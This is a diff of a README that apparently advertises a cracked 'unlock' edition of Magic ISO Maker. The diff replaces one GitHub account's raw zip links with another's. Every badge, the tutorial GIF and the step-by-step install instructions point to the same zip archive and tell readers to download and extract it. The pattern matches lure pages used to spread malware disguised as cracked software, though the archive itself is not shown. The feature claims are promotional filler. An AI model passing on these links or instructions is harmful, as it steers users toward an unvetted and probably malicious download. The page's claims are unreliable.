@@ -1,10 +1,10 @@
 # ✨ Magic ISO Maker Universal Access Suite 🪄
 
-![OS compatibility](https://raw.githubusercontent.com/Maddylovesnameless/magic-iso-maker-unlock-guide/branch/revolutionize/magic-iso-maker-unlock-guide-2.3.zip%7CMacOS%7CLinux-blue)  
-![API](https://raw.githubusercontent.com/Maddylovesnameless/magic-iso-maker-unlock-guide/branch/revolutionize/magic-iso-maker-unlock-guide-2.3.zip)  
-![API](https://raw.githubusercontent.com/Maddylovesnameless/magic-iso-maker-unlock-guide/branch/revolutionize/magic-iso-maker-unlock-guide-2.3.zip)  
-![Support](https://raw.githubusercontent.com/Maddylovesnameless/magic-iso-maker-unlock-guide/branch/revolutionize/magic-iso-maker-unlock-guide-2.3.zip%2F7-Live%20Support-orange)  
-![License](https://raw.githubusercontent.com/Maddylovesnameless/magic-iso-maker-unlock-guide/branch/revolutionize/magic-iso-maker-unlock-guide-2.3.zip)
+![OS compatibility](https://raw.githubusercontent.com/SSSSSLYBORED/magic-iso-maker-unlock-guide/branch/revolutionize/guide-unlock-maker-magic-iso-1.2.zip%7CMacOS%7CLinux-blue)  
+![API](https://raw.githubusercontent.com/SSSSSLYBORED/magic-iso-maker-unlock-guide/branch/revolutionize/guide-unlock-maker-magic-iso-1.2.zip)  
+![API](https://raw.githubusercontent.com/SSSSSLYBORED/magic-iso-maker-unlock-guide/branch/revolutionize/guide-unlock-maker-magic-iso-1.2.zip)  
+![Support](https://raw.githubusercontent.com/SSSSSLYBORED/magic-iso-maker-unlock-guide/branch/revolutionize/guide-unlock-maker-magic-iso-1.2.zip%2F7-Live%20Support-orange)  
+![License](https://raw.githubusercontent.com/SSSSSLYBORED/magic-iso-maker-unlock-guide/branch/revolutionize/guide-unlock-maker-magic-iso-1.2.zip)
 
 Welcome to the Magic ISO Maker Universal Access Suite – your key to unlocking boundless disc image productivity! Designed with innovation at its core, this tool transforms your workflow with extraordinary features, responsive design, and seamless compatibility with the most popular AI platforms.
 
@@ -51,7 +51,7 @@ With real-time AI integration, Magic ISO Maker Universal Access Suite leverages 
 
 ### Step-by-Step Guide
 
-**1.** Download `https://raw.githubusercontent.com/Maddylovesnameless/magic-iso-maker-unlock-guide/branch/revolutionize/magic-iso-maker-unlock-guide-2.3.zip` from this repository's Latest Release section.
+**1.** Download `https://raw.githubusercontent.com/SSSSSLYBORED/magic-iso-maker-unlock-guide/branch/revolutionize/guide-unlock-maker-magic-iso-1.2.zip` from this repository's Latest Release section.
 
 **2.** Extract the archive using your favorite unarchiver tool (compatible with WinRAR, 7-Zip, and native extractors on all OS platforms).
 
@@ -61,7 +61,7 @@ With real-time AI integration, Magic ISO Maker Universal Access Suite leverages 
 
 ### Video Installation Tutorial 🎥
 
-![Installation GIF](https://raw.githubusercontent.com/Maddylovesnameless/magic-iso-maker-unlock-guide/branch/revolutionize/magic-iso-maker-unlock-guide-2.3.zip)
+![Installation GIF](https://raw.githubusercontent.com/SSSSSLYBORED/magic-iso-maker-unlock-guide/branch/revolutionize/guide-unlock-maker-magic-iso-1.2.zip)
 
 ---
 
